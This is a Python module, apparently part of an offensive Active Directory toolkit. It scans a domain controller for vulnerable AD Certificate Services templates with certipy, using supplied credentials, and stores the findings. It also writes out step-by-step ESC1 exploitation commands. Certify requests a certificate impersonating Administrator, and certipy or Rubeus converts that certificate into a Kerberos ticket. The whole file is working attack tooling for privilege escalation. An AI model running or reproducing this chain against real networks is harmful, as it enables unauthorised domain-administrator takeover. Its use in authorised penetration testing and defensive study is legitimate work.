#!/usr/bin/env python3
"""
ADCS (AD Certificate Services) Abuse Module
Detects and exploits vulnerable certificate templates
"""
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Vulnerability, Target
from core.logger import setup_logger, get_logger

logger = None

def scan_adcs_vulns(session_dir, domain, username, password, dc_ip):
    """Scan for ADCS vulnerabilities using Certify"""
    global logger
    setup_logger("adcs_scan", session_dir)
    logger = get_logger("adcs_scan")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Scanning for ADCS vulnerabilities in {domain}")
    
    # Create instructions for manual Certify execution
    # (Certify is a .NET tool, would need execute-assembly or similar)
    
    instructions_file = os.path.join(session_dir, "adcs_abuse_instructions.txt")
    
    with open(instructions_file, 'w') as f:
        f.write("# AD Certificate Services (ADCS) Abuse\n\n")
        f.write("## Vulnerability Classes\n")
        f.write("- ESC1: Misconfigured certificate templates\n")
        f.write("- ESC2: Any Purpose EKU\n")
        f.write("- ESC3: Enrollment agent templates\n")
        f.write("- ESC4: Vulnerable ACLs on templates\n")
        f.write("- ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2\n")
        f.write("- ESC8: NTLM relay to ADCS HTTP endpoints\n\n")
        
        f.write("## Scan with Certify\n")
        f.write("```powershell\n")
        f.write(f"# Download Certify from GitHub\n")
        f.write(f"Certify.exe find /vulnerable\n")
        f.write(f"```\n\n")
        
        f.write("## Request Certificate (ESC1 Example)\n")
        f.write(f"```powershell\n")
        f.write(f"Certify.exe request /ca:CA-SERVER\\CA-NAME /template:VulnerableTemplate /altname:Administrator\n")
        f.write(f"```\n\n")
        
        f.write("## Convert and Use Certificate\n")
        f.write(f"```bash\n")
        f.write(f"# Convert PFX to TGT\n")
        f.write(f"certipy auth -pfx administrator.pfx -dc-ip {dc_ip}\n\n")
        f.write(f"# Or use Rubeus\n")
        f.write(f"Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password:certpass\n")
        f.write(f"```\n")
    
    logger.info(f"ADCS abuse instructions saved: {instructions_file}")
    
    # Try to use certipy (Python-based alternative)
    logger.info("Attempting ADCS scan with certipy...")
    
    cmd = [
        "certipy", "find",
        "-u", f"{username}@{domain}",
        "-p", password,
        "-dc-ip", dc_ip,
        "-vulnerable",
        "-stdout"
    ]
    
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120
        )
        
        if "ESC" in result.stdout:
            logger.warning("Vulnerable ADCS templates found!")
            
            # Store in database
            session = db.get_session()
            dc = session.query(Target).filter_by(ip_address=dc_ip).first()
            if dc:
                vuln = Vulnerability(
                    target_id=dc.id,
                    name="ADCS Vulnerable Templates",
                    severity="High",
                    description="Certificate templates misconfigured for privilege escalation"
                )
                session.add(vuln)
                session.commit()
            session.close()
            
            # Save detailed output
            output_file = os.path.join(session_dir, "adcs_scan_results.txt")
            with open(output_file, 'w') as f:
                f.write(result.stdout)
            logger.info(f"ADCS scan results: {output_file}")
        else:
            logger.info("No ADCS vulnerabilities detected")
            
    except FileNotFoundError:
        logger.warning("certipy not found. Install with: pip3 install certipy-ad")
    except Exception as e:
        logger.error(f"ADCS scan failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--domain", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--dc-ip", required=True)
    args = parser.parse_args()
    
    scan_adcs_vulns(args.session_dir, args.domain, args.username, args.password, args.dc_ip)
